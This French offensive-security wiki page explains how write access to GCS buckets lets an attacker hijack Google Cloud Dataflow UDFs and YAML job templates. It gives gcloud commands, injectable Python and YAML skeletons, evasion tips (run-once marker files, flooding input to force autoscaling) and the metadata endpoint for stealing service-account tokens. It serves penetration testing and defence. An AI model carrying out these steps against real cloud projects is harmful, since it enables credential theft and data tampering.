# GCP - Escalade de privilèges Dataflow

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow ne valide pas l'intégrité des UDFs et des YAML de job template stockés dans GCS.
Avec un accès en écriture au bucket, vous pouvez écraser ces fichiers pour injecter du code, exécuter du code sur les workers, voler des tokens de compte de service, ou altérer le traitement des données.
Les jobs de pipeline batch et streaming sont des cibles viables pour cette attaque. Pour exécuter cette attaque sur un pipeline, il faut remplacer les UDFs/templates avant que le job ne s'exécute, durant les premières minutes (avant la création des workers) ou pendant l'exécution du job avant que de nouveaux workers ne soient créés (à cause de l'autoscaling).

**Vecteurs d'attaque :**
- **Détournement d'UDF :** Python (`.py`) et JS (`.js`) UDFs référencées par les pipelines et stockées dans des buckets gérés par le client
- **Détournement de job template :** définitions YAML de pipeline personnalisées stockées dans des buckets gérés par le client


> [!WARNING]
> **Astuce run-once-per-worker :** Les UDFs et les callables de template Dataflow sont invoqués **par ligne/entrée**. Sans coordination, l'exfiltration ou le vol de tokens s'exécuterait des milliers de fois, générant du bruit, du rate limiting et une détection. Utilisez un pattern de **coordination basé sur un fichier** : vérifiez si un fichier marqueur (par ex. `/tmp/pwnd.txt`) existe au démarrage ; s'il existe, sautez le code malveillant ; sinon, exécutez le payload et créez le fichier. Cela garantit que le payload s'exécute **une seule fois par worker**, et non par ligne.


#### Exploitation directe via gcloud CLI

1. Énumérer les jobs Dataflow et localiser les chemins GCS des templates/UDFs :

<details>

<summary>Lister les jobs et utiliser describe pour obtenir le chemin du template, l'emplacement de staging, et les références UDF</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. Télécharger l'UDF original ou le template de job depuis GCS :

<details>

<summary>Télécharger le fichier UDF ou le template YAML depuis le bucket</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. Éditez le fichier localement : injectez la payload malveillante (voir les extraits Python UDF ou YAML ci‑dessous) et assurez-vous que le modèle de coordination run-once est utilisé.

4. Téléversez à nouveau pour écraser le fichier original :

<details>

<summary>Overwrite UDF or template in bucket</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. Attendez la prochaine exécution du job, ou (pour streaming) déclenchez autoscaling (par ex. inondez l'entrée du pipeline) afin que de nouveaux workers démarrent et récupèrent le fichier modifié.

#### Python UDF injection

Si vous voulez que le worker exfiltrate des données vers votre serveur C2, utilisez `urllib.request` et non `requests`.
`requests` n'est pas préinstallé sur les workers Dataflow classiques.

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Injection dans le template de job YAML

Injectez une étape `MapToFields` avec un callable qui utilise un fichier de coordination. Pour les pipelines basés sur YAML qui prennent en charge `requests`, utilisez-le si le template déclare `dependencies: [requests]`; sinon privilégiez `urllib.request`.

Ajoutez l'étape de nettoyage (`drop: [malicious_step]`) afin que le pipeline écrive toujours des données valides vers la destination.

<details>

<summary>Étape MapToFields malveillante et nettoyage dans le YAML du pipeline</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Accès Compute Engine aux Dataflow Workers

**Autorisations :** `compute.instances.osLogin` ou `compute.instances.osAdminLogin` (avec `iam.serviceAccounts.actAs` sur le worker SA), ou `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (avec `iam.serviceAccounts.actAs`) pour l'injection de clés SSH héritée

Les Dataflow workers s'exécutent en tant que VMs Compute Engine. L'accès aux workers via OS Login ou SSH permet de lire les tokens SA depuis le endpoint de métadonnées (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`), manipuler des données ou exécuter du code arbitraire.

Pour les détails d'exploitation, voir :
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## Références

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
